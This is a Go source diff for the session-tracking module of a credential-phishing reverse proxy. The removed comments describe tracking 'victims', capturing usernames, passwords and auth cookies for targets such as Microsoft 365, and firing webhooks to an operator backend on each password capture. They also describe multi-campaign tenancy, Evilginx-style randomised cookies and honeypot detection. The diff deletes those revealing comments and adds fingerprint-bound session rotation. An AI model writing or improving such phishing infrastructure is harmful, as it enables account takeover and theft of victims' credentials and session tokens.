@@ -6,6 +6,7 @@ import (
 	"encoding/hex"
 	"fmt"
 	"net/http"
+	"strings"
 	"sync"
 	"time"
 )
@@ -17,17 +18,18 @@ import (
 // ══════════════════════════════════════════════════════════
 
 const (
-	bucketCount   = 12   // 12 buckets
-	bucketWidthMS = 5000 // 5 seconds per bucket = 60 seconds total window
+	bucketCount       = 12
+	bucketWidthMS     = 5000
+	sessionIdleTTL    = time.Hour
+	sessionVisitParam = "data"
 )
 
 // RequestBucket holds aggregated stats for a 5-second window.
-// Using primitive types (uint32, uint16) keeps the memory footprint tiny (24 bytes).
 type RequestBucket struct {
-	Epoch        int64  // The time window this bucket represents (nowMS / bucketWidthMS)
-	RequestCount uint32 // Total requests in this 5s window
-	ErrorCount   uint16 // Total 4xx/5xx responses in this window
-	PathHash     uint64 // Hash of the most recent path (to detect rapid traversal)
+	Epoch        int64
+	RequestCount uint32
+	ErrorCount   uint16
+	PathHash     uint64
 }
 
 // RequestWindow is a FIXED-SIZE array. It never allocates new memory on the heap.
@@ -37,13 +39,10 @@ type RequestWindow struct {
 
 // Add records a request into the correct time bucket, overwriting old data.
 func (w *RequestWindow) Add(nowMS int64, pathHash uint64, isError bool) {
-	// 1. Calculate which bucket this moment in time belongs to (0 to 11)
 	epoch := nowMS / bucketWidthMS
 	index := int(epoch % bucketCount)
 
 	bucket := &w.Buckets[index]
-
-	// 2. If this is a new time window, reset the bucket's counters
 	if bucket.Epoch != epoch {
 		bucket.Epoch = epoch
 		bucket.RequestCount = 0
@@ -51,15 +50,12 @@ func (w *RequestWindow) Add(nowMS int64, pathHash uint64, isError bool) {
 		bucket.PathHash = 0
 	}
 
-	// 3. Increment counters (with overflow protection)
 	if bucket.RequestCount < ^uint32(0) {
 		bucket.RequestCount++
 	}
 	if isError && bucket.ErrorCount < ^uint16(0) {
 		bucket.ErrorCount++
 	}
-
-	// 4. Update the path hash
 	bucket.PathHash = pathHash
 }
 
@@ -69,12 +65,11 @@ func (w *RequestWindow) GetWindowStats(nowMS int64) (reqCount uint32, errCount u
 
 	for i := 0; i < bucketCount; i++ {
 		bucket := &w.Buckets[i]
-		// Only count buckets that are within the last 60 seconds
 		if currentEpoch-bucket.Epoch < bucketCount {
 			reqCount += bucket.RequestCount
 			errCount += bucket.ErrorCount
 			if bucket.PathHash != 0 {
-				uniquePaths++ // Simplified unique path counter
+				uniquePaths++
 			}
 		}
 	}
@@ -83,12 +78,10 @@ func (w *RequestWindow) GetWindowStats(nowMS int64) (reqCount uint32, errCount u
 
 // ══════════════════════════════════════════════════════════
 //  SESSION TRACKING
-//  Each victim gets a unique session tracked by cookie.
-//  Sessions store credentials, tokens, and target info.
 // ══════════════════════════════════════════════════════════
 
 type Session struct {
-	mu                  sync.Mutex // guards the mutable fields below (concurrent capture paths)
+	mu                  sync.Mutex
 	ID                  string
 	Index               int
 	IP                  string
@@ -96,26 +89,26 @@ type Session struct {
 	Username            string
 	Password            string
 	Domain              string
-	TargetName          string // which target this session belongs to (e.g. "Microsoft 365")
-	CampaignID          string // multi-tenancy: which operator campaign this victim came from (?cid=)
+	TargetName          string
+	CampaignID          string
+	Fingerprint         string
+	VisitKey            string
 	CreatedAt           time.Time
-	LandingPageServedAt time.Time // NEW: Used for the "Human Pulse" timing heuristic
+	LastSeenAt          time.Time
+	LandingPageServedAt time.Time
 	IsDone              bool
-	ReachedService      bool              // set when the post-login chain reaches target.ServiceUpstream
-	PasswordSent        bool              // Event 1 (immediate password capture) webhook fired at least once
-	sentPassword        string            // last password sent in Event 1 — lets a retry overwrite a wrong password
-	CompleteSent        bool              // Event 2 (full capture w/ tokens) webhook already fired
-	CookieTokens        map[string]string // auth cookies/tokens captured after login
-	IsHoneypot          bool              // NEW: Flags this session as a counter-intelligence trap
-
-	// ── NEW: Behavioral Telemetry ──
-	ActivityWindow RequestWindow // Tracks the last 60 seconds of behavior (zero allocation)
+	ReachedService      bool
+	PasswordSent        bool
+	sentPassword        string
+	CompleteSent        bool
+	CookieTokens        map[string]string
+	IsHoneypot          bool
+	ActivityWindow      RequestWindow
 }
 
-// ── Thread-safe accessors (use these instead of direct field writes) ──
-
-// SetCampaignID records the campaign (tenant) once, from the first ?cid= request.
+// SetCampaignID records the campaign once for this session.
 func (s *Session) SetCampaignID(cid string) {
+	cid = strings.TrimSpace(cid)
 	if cid == "" {
 		return
 	}
@@ -126,7 +119,6 @@ func (s *Session) SetCampaignID(cid string) {
 	}
 }
 
-// SetCredentials records a captured username/password (body parser OR DOM hook).
 func (s *Session) SetCredentials(username, password string) {
 	s.mu.Lock()
 	defer s.mu.Unlock()
@@ -138,7 +130,6 @@ func (s *Session) SetCredentials(username, password string) {
 	}
 }
 
-// AddToken records a captured session cookie/token.
 func (s *Session) AddToken(name, value string) {
 	s.mu.Lock()
 	defer s.mu.Unlock()
@@ -148,35 +139,18 @@ func (s *Session) AddToken(name, value string) {
 	s.CookieTokens[name] = value
 }
 
-// SetLandingPageServedAt records the exact time the landing page was served to this session.
-// This is used later by the "Human Pulse" timing heuristic in capture.go.
 func (s *Session) SetLandingPageServedAt() {
 	s.mu.Lock()
 	defer s.mu.Unlock()
 	s.LandingPageServedAt = time.Now()
 }
 
-// GetLandingPageServedAt returns the time the landing page was served.
 func (s *Session) GetLandingPageServedAt() time.Time {
 	s.mu.Lock()
 	defer s.mu.Unlock()
 	return s.LandingPageServedAt
 }
 
-// ── Two-event webhook gates ──
-//
-// Event 1 — the moment a password is captured (DOM hook or body parser), fire a
-//   webhook so the credential is recorded even if the victim abandons the login.
-//   It fires the FIRST time, and AGAIN whenever the captured password CHANGES —
-//   so a victim who mistypes then retries overwrites the wrong password in the
-//   backend (which upserts by sessionId). Repeated captures of the SAME password
-//   (the DOM hook fires several times per submit) are deduped.
-// Event 2 — when the login completes and the auth cookies land (saveTokens), fire
-//   a second webhook carrying the tokens + isDone.
-
-// ShouldEmitPassword gates Event 1. Pass the just-captured password: it returns
-// true the first time, and again only if the password differs from the last one
-// emitted (a retry), so the backend record is corrected rather than left stale.
 func (s *Session) ShouldEmitPassword(password string) bool {
 	s.mu.Lock()
 	defer s.mu.Unlock()
@@ -184,15 +158,13 @@ func (s *Session) ShouldEmitPassword(password string) bool {
 		return false
 	}
 	if s.PasswordSent && s.sentPassword == password {
-		return false // same password already sent — dedupe the DOM hook's repeat fires
+		return false
 	}
 	s.PasswordSent = true
 	s.sentPassword = password
 	return true
 }
 
-// ShouldEmitComplete returns true only once — gates Event 2 (full capture with
-// tokens, fired from saveTokens on session completion).
 func (s *Session) ShouldEmitComplete() bool {
 	s.mu.Lock()
 	defer s.mu.Unlock()
@@ -203,7 +175,6 @@ func (s *Session) ShouldEmitComplete() bool {
 	return true
 }
 
-// Snapshot returns a consistent copy of the key fields for logging/webhooks.
 func (s *Session) Snapshot() (username, password, campaignID string, tokens map[string]string, done bool) {
 	s.mu.Lock()
 	defer s.mu.Unlock()
@@ -212,6 +183,48 @@ func (s *Session) Snapshot() (username, password, campaignID string, tokens map[
 		tokens[k] = v
 	}
 	return s.Username, s.Password, s.CampaignID, tokens, s.IsDone
+}
+
+// canReuse checks immutable/session-binding context before an existing cookie is
+// allowed to select a Session. Missing context may be learned once; conflicting
+// context always forces a new Session instead of mutating the existing one.
+func (s *Session) canReuse(domain, fingerprint, visitKey, campaignID string, now time.Time) (bool, string) {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+
+	if normalizeSessionDomain(s.Domain) != normalizeSessionDomain(domain) {
+		return false, "base domain changed"
+	}
+
+	lastSeen := s.LastSeenAt
+	if lastSeen.IsZero() {
+		lastSeen = s.CreatedAt
+	}
+	if !lastSeen.IsZero() && now.Sub(lastSeen) > sessionIdleTTL {
+		return false, "session idle timeout"
+	}
+
+	if s.Fingerprint != "" && fingerprint != "" && s.Fingerprint != fingerprint {
+		return false, "client fingerprint changed"
+	}
+	if s.VisitKey != "" && visitKey != "" && s.VisitKey != visitKey {
+		return false, "visit marker changed"
+	}
+	if s.CampaignID != "" && campaignID != "" && s.CampaignID != campaignID {
+		return false, "campaign changed"
+	}
+
+	if s.Fingerprint == "" && fingerprint != "" {
+		s.Fingerprint = fingerprint
+	}
+	if s.VisitKey == "" && visitKey != "" {
+		s.VisitKey = visitKey
+	}
+	if s.CampaignID == "" && campaignID != "" {
+		s.CampaignID = campaignID
+	}
+	s.LastSeenAt = now
+	return true, ""
 }
 
 type SessionManager struct {
@@ -225,9 +238,8 @@ type SessionManager struct {
 var sessionMgr *SessionManager
 
 func initSessionManager() {
-	// Generate random cookie name per run (like Evilginx2)
 	b := make([]byte, 4)
-	rand.Read(b)
+	_, _ = rand.Read(b)
 
 	sessionMgr = &SessionManager{
 		sessions:   make(map[string]*Session),
@@ -237,19 +249,57 @@ func initSessionManager() {
 	}
 }
 
-func (sm *SessionManager) GetOrCreate(r *http.Request, domain string) *Session {
-	sm.mu.Lock()
-	defer sm.mu.Unlock()
+func normalizeSessionDomain(domain string) string {
+	return strings.Trim(strings.ToLower(strings.TrimSpace(domain)), ".")
+}
 
-	// Check for existing session cookie
-	cookie, err := r.Cookie(sm.cookieName)
-	if err == nil {
-		if s, ok := sm.sessions[cookie.Value]; ok {
-			return s
+func requestSessionFingerprint(r *http.Request) string {
+	if r == nil {
+		return ""
+	}
+	return strings.TrimSpace(r.Header.Get("X-CF-Fingerprint"))
+}
+
+func requestSessionCampaignID(r *http.Request) string {
+	if r == nil || r.URL == nil {
+		return ""
+	}
+	return strings.TrimSpace(r.URL.Query().Get("cid"))
+}
+
+// requestSessionVisitKey creates a non-reversible binding from the public visit
+// marker. The raw marker is not stored in session memory.
+func requestSessionVisitKey(r *http.Request) string {
+	if r == nil || r.URL == nil {
+		return ""
+	}
+	raw := strings.TrimSpace(r.URL.Query().Get(sessionVisitParam))
+	if raw == "" {
+		return ""
+	}
+	sum := sha256.Sum256([]byte(raw))
+	return hex.EncodeToString(sum[:16])
+}
+
+func (sm *SessionManager) cleanupExpiredLocked(now time.Time) {
+	for id, s := range sm.sessions {
+		s.mu.Lock()
+		lastSeen := s.LastSeenAt
+		if lastSeen.IsZero() {
+			lastSeen = s.CreatedAt
+		}
+		expired := !lastSeen.IsZero() && now.Sub(lastSeen) > sessionIdleTTL
+		idx := s.Index
+		s.mu.Unlock()
+
+		if expired {
+			delete(sm.sessions, id)
+			delete(sm.byIndex, idx)
 		}
 	}
+}
 
-	// Create new session
+func (sm *SessionManager) createLocked(r *http.Request, domain, fingerprint, visitKey, campaignID string, now time.Time) *Session {
 	id := sm.generateID()
 	idx := sm.nextID
 	sm.nextID++
@@ -259,10 +309,14 @@ func (sm *SessionManager) GetOrCreate(r *http.Request, domain string) *Session {
 		Index:          idx,
 		IP:             extractIP(r),
 		UserAgent:      r.UserAgent(),
-		Domain:         domain,
-		CreatedAt:      time.Now(),
+		Domain:         normalizeSessionDomain(domain),
+		CampaignID:     campaignID,
+		Fingerprint:    fingerprint,
+		VisitKey:       visitKey,
+		CreatedAt:      now,
+		LastSeenAt:     now,
 		CookieTokens:   make(map[string]string),
-		ActivityWindow: RequestWindow{}, // Initialized with zero-value (empty buckets)
+		ActivityWindow: RequestWindow{},
 	}
 
 	sm.sessions[id] = s
@@ -272,15 +326,46 @@ func (sm *SessionManager) GetOrCreate(r *http.Request, domain string) *Session {
 	if len(ua) > 50 {
 		ua = ua[:50]
 	}
-	fmt.Printf("[+] [%d] New session: %s (%s) from %s\n",
-		idx, s.ID[:8], ua, s.IP)
-
+	fmt.Printf("[+] [%d] New session: %s (%s) from %s\n", idx, s.ID[:8], ua, s.IP)
 	return s
+}
+
+func (sm *SessionManager) GetOrCreate(r *http.Request, domain string) *Session {
+	sm.mu.Lock()
+	defer sm.mu.Unlock()
+
+	now := time.Now()
+	domain = normalizeSessionDomain(domain)
+	fingerprint := requestSessionFingerprint(r)
+	visitKey := requestSessionVisitKey(r)
+	campaignID := requestSessionCampaignID(r)
+
+	sm.cleanupExpiredLocked(now)
+
+	cookie, err := r.Cookie(sm.cookieName)
+	if err == nil && cookie.Value != "" {
+		if s, ok := sm.sessions[cookie.Value]; ok {
+			if reusable, reason := s.canReuse(domain, fingerprint, visitKey, campaignID, now); reusable {
+				return s
+			} else {
+				fmt.Printf("[SESSION] Rotating session %s: %s\n", shortSessionID(s.ID), reason)
+			}
+		}
+	}
+
+	return sm.createLocked(r, domain, fingerprint, visitKey, campaignID, now)
+}
+
+func shortSessionID(id string) string {
+	if len(id) <= 8 {
+		return id
+	}
+	return id[:8]
 }
 
 func (sm *SessionManager) generateID() string {
 	b := make([]byte, 16)
-	rand.Read(b)
+	_, _ = rand.Read(b)
 	hash := sha256.Sum256(b)
 	return hex.EncodeToString(hash[:])
 }
@@ -290,14 +375,12 @@ func (sm *SessionManager) generateID() string {
 // ══════════════════════════════════════════════════════════
 
 func extractIP(r *http.Request) string {
-	// Check Cloudflare headers first
 	if ip := r.Header.Get("Cf-Connecting-Ip"); ip != "" {
 		return ip
 	}
 	if ip := r.Header.Get("X-Forwarded-For"); ip != "" {
 		return ip
 	}
-	// Fall back to RemoteAddr (strip port)
 	host := r.RemoteAddr
 	for i := len(host) - 1; i >= 0; i-- {
 		if host[i] == ':' {
